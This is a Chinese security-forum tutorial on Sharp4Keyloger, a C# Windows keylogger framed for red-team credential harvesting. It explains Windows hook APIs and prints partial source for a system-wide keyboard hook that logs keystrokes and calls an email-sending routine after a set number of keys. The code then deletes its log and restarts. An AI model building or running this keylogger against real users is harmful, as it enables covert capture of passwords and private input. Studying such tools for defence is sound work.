# Sharp4Keyloger：一款通过 API 函数实现 Windows 键盘日志记录的工具-先知社区

> **来源**: https://xz.aliyun.com/news/17023  
> **文章ID**: 17023

---

在红队渗透测试中，信息收集是最重要的初期阶段之一。通过精确地获取目标系统上的信息，红队能够识别潜在的攻击路径，并为后续的攻击提供有价值的数据。在这其中，键盘记录器（Keylogger）作为一种常见的攻击手段，可以有效地收集用户输入的信息，帮助攻击者获取目标用户的敏感数据，如登录凭据、系统操作命令等。

​

本文将探讨 Sharp4Keyloger.exe 在内网渗透中的应用，以及如何通过利用键盘记录器工具，收集关键数据。我们将重点分析其在红队渗透阶段的实际使用场景，并探讨其技术实现方法。

### 0x01 钩子（Hook）

钩子（Hook）是一种 Windows 操作内置的监控和拦截机制，通过程序拦截和处理操作系统或应用程序中的特定事件或消息，钩子通常用于监视和修改系统行为，可以获取或改变事件流，而无需直接修改目标程序的源代码。在系统中，钩子可以用于监控键盘、鼠标、窗口消息等各种系统事件。

### **1.1 原理和类型**

钩子的工作原理基于事件流拦截，当系统或应用程序发生事件时，钩子会被触发，程序可以通过钩子回调函数获取事件信息，并决定是否继续传递该事件或修改事件。具体流程而言，大致上可分为安装钩子、处理事件、事件传递、卸载钩子。

1. 安装钩子：钩子通过调用 SetWindowsHookEx 函数来安装。这个函数允许应用程序指定一个回调函数，操作系统会在事件发生时调用这个回调函数。
2. 处理事件：当键盘输入或者鼠标点击等事件发生时，钩子的回调函数被调用，应用程序可以通过该函数对事件进行处理、修改或记录。
3. 事件传递：钩子回调函数可以决定是否将事件传递给下一个钩子，主要通过 CallNextHookEx函数实现。如果钩子不调用 CallNextHookEx，则后续钩子或系统的默认处理程序将不会收到该事件。
4. 卸载钩子：钩子完成任务后，通过调用 UnhookWindowsHookEx 函数卸载钩子，释放资源。

在 Windows 系统中，钩子分为多种类型，主要有键盘钩子、鼠标钩子、消息钩子、系统钩子。其中，系统钩子允许应用程序拦截系统级别的事件，如系统通知、窗口切换、应用程序启动等。

​

## **0x02 钩子关联的API函数**

Windows 操作系统包含了大量的 API 函数可以帮助用户安装钩子和卸载，通常运行时可以拦截键盘和鼠标事件。特别是 SetWindowsHookEx 和 CallNextHookEx 这两个函数能够在全局范围内处理键盘、鼠标输入事件。

### **2.1 SetWindowsHookEx**

SetWindowsHookEx 函数用于安装钩子。此函数主要用于创建钩子链，允许应用程序拦截和处理事件，具体函数的签名如下所示。

```
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr SetWindowsHookEx(int idHook, Program.LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
```

​

参数 idHook，表示指定希望安装的钩子类型，比如 WH\_KEYBOARD\_LL 用于拦截低级别键盘输入（LowLevelKeyboardProc）。参数 lpfn 表示钩子回调函数指针，当事件发生时，系统会调用此回调函数。参数 hMod 表示钩子句柄，如果安装钩子成功，返回一个钩子句柄，否则返回 IntPtr.Zero。

### **2.2 CallNextHookEx**

CallNextHookEx 函数用于将事件传递给下一个钩子或钩子链中的下一个处理程序。这是钩子处理链的一部分，用于确保事件能够继续传递到其他钩子或系统， 具体函数的签名如下所示。

```
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
```

​

参数 hhk，表示当前钩子的句柄，通常是通过 SetWindowsHookEx 返回的句柄。参数 nCode 用于指定事件类型，通常是键盘事件、鼠标事件等。如果是 WH\_KEYBOARD\_LL，则为键盘事件的类型。返回值取决于钩子的实现。一般来说，将返回下一个钩子的处理结果

### **2.3 UnhookWindowsHookEx**

UnhookWindowsHookEx 函数用于卸载已经安装的钩子。调用此函数可以移除之前通过 SetWindowsHookEx 安装的钩子。 具体函数的签名如下所示。

```
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
private static extern bool UnhookWindowsHookEx(IntPtr hhk);
```

​

参数 hhk，表示要卸载的钩子的句柄，通常是 SetWindowsHookEx 返回的句柄，如果卸载钩子成功，返回 true ，否则返回 false 。可以通过 Marshal.GetLastWin32Error() 获取更多的错误信息。

## **0x03 调用键盘钩子**

下面这段代码实现了一个 键盘钩子，它会监听所有键盘按键事件，并将按下的键记录到文件。记录过程中会排除 Caps Lock 和 Backspace 键。

首先， 定义了一个 键盘钩子回调函数。\_proc 是一个委托，指向 HookCallback 方法，将用作钩子的回调。

```
private static Program.LowLevelKeyboardProc _proc = new Program.LowLevelKeyboardProc(Program.HookCallback);
```

接着，定义了一个静态变量 \_hookID 来存储钩子句柄。钩子句柄是设置钩子时操作系统返回的一个值，用于卸载钩子或后续操作。

```
private static IntPtr _hookID = IntPtr.Zero;
private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
```

并且，定义了低级键盘钩子的回调签名。此处的 LowLevelKeyboardProc 会处理按键事件。

随后，定义一个 SetHook 方法设置钩子。通过调用 Windows API 函数 SetWindowsHookEx 来安装钩子，具体的代码如下所示。

```
private static IntPtr SetHook(Program.LowLevelKeyboardProc proc)
{
    IntPtr result;
    using (Process curProcess = Process.GetCurrentProcess())
    {
        using (ProcessModule curModule = curProcess.MainModule)
        {
            result = Program.SetWindowsHookEx(13, proc, Program.GetModuleHandle(curModule.ModuleName), 0U);
        }
    }
    return result;
}
```

此处的 proc 是回调函数，就是自定义的 HookCallback 函数，它会在键盘事件发生时被调用，GetModuleHandle(curModule.ModuleName) 方法获取当前进程的模块句柄，用于指定钩子所在的 当前进程，0U 代表钩子应用于所有的Windows进程。

跟进 HookCallback 函数，此函数是键盘钩子的回调函数，拦截和监控记录的操作均位于此函数内实现，比如我们会调用 WriteFile 函数将键盘的值转换后保存到日志文件中。具体代码如下所示。

```
private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
{
    bool flag = nCode >= 0 && wParam == (IntPtr)256;
    if (flag)
    {
        int vkCode = Marshal.ReadInt32(lParam);
        bool flag2 = vkCode == 20 || vkCode == 8;
        if (flag2)
        {
            return Program.CallNextHookEx(Program._hookID, nCode, wParam, lParam);
        }
        string output = Convert.ToString((Keys)vkCode);
        Program.WriteFile(output);
        Program.logged++;
        bool flag3 = Program.logged == Program.Turn;
        if (flag3)
        {
            Program.email_send();
            try
            {
                File.Delete(Program.path);
            }
            catch (Exception)
            {
            }
            Application.Restart();
        }
    }
    return Program.CallNextHookEx(Program._hookID, nCode, wParam, lParam);
}
```

该函数传递的参数中 nCode 是钩子接收到的消息类型，比如，按键按下、按键释放等操作。而且这里检查 nCode >= 0 和 wParam == (IntPtr)256，确保事件是键盘按下KEYDOWN 事件。另外， vkCode == 20 || vkCode == 8 用于排除 **Caps Lock**（20）和 **Backspace**（8）按键。如果是这两个按键之一，则不进行后续操作。

## **0x04 调用键盘钩子**

这里重点介绍一下方法体内调用的 WriteFile 函数，主要目的是在监听键盘事件时，处理不同的按键输入并将其写入文件。它根据不同的按键或按键组合（如Shift、CapsLock、数字键盘等），决定输入字符的输出，关于该函数的代码实现如下所示。

### **4.1 处理特殊按键**

ToWrite 变量是输入的按键名称，首先不记录 Shift 键， 对于 **Return**（回车键）按键，输出换行符， 对于 **OEMPeriod**（句号键）按键，输出句号字符。代码如下所示。

```
if (ToWrite == "ShiftKey") { /* 不记录 Shift 键 */ }
else if (ToWrite == "Return") { appendText = Environment.NewLine; }
else if (ToWrite == "Space") { appendText = " "; }
else if (ToWrite == "OEMPeriod") { appendText = "."; } 
```

​

### **4.2 数字键处理**

对键盘上的常规数字做处理转换， 如果按下了 **Shift** 键，会输出对应的特殊字符（如 D1 输出 1，按下 Shift 时输出 !），具体代码如下所示。

```
else if (ToWrite.StartsWith("NumPad"))
{
    appendText = ToWrite.Substring(6);  // NumPad1 -> 1
}
else if (ToWrite.StartsWith("D") && ToWrite.Length == 2 && char.IsDigit(ToWrite[1]))
{
    bool isShiftPressed = (Control.ModifierKeys & Keys.Shift) > Keys.None;
    // 根据是否按下 Shift 键来确定按键输出的字符
    switch (ToWrite[1])
    {
        case '0': appendText = isShiftPressed ? ")" : "0"; break;
        case '1': appendText = isShiftPressed ? "!" : "1"; break;
        case '2': appendText = isShiftPressed ? "@" : "2"; break;
        case '3': appendText = isShiftPressed ? "#" : "3"; break;
        case '4': appendText = isShiftPressed ? "$" : "4"; break;
        case '5': appendText = isShiftPressed ? "%" : "5"; break;
        case '6': appendText = isShiftPressed ? "^" : "6"; break;
        case '7': appendText = isShiftPressed ? "&" : "7"; break;
        case '8': appendText = isShiftPressed ? "*" : "8"; break;
        case '9': appendText = isShiftPressed ? "(" : "9"; break;
    }
}
```

​

### **4.3 字母键大小写处理**

对于字母按键（如 a, b 等），如果按下了 **Shift** 键或 **CapsLock** 开关打开，则输出大写字母，否则输出小写字母。具体代码如下所示。

```
else if (ToWrite.Length == 1 && char.IsLetter(ToWrite[0]) && ToWrite != "D")
{
    bool isShiftPressed2 = (Control.ModifierKeys & Keys.Shift) > Keys.None;
    bool isCapsLockOn = Control.IsKeyLocked(Keys.Capital);
    bool flag8 = isShiftPressed2 || isCapsLockOn;
    if (flag8)
    {
        appendText = ToWrite.ToUpper();
    }
    else
    {
        appendText = ToWrite.ToLower();
    }
}
```

最终，决定好要记录的字符 appendText 后，使用 File.AppendAllText 方法将字符追加到指定的文件中，运行时如下图所示。

​

![](images/20250306104928-9f7837b7-fa35-1.png!post)

## **0x05 小结**

综上，键盘记录在渗透测试中的作用不可忽视，不仅能帮助攻击者获取目标用户的敏感数据，还能为进一步的攻击提供丰富的信息。在信息收集阶段，Sharp4Keyloger 键盘记录器作为一个有效的工具，能够监控用户输入并记录下来，包括登录凭证、系统命令、敏感信息等。
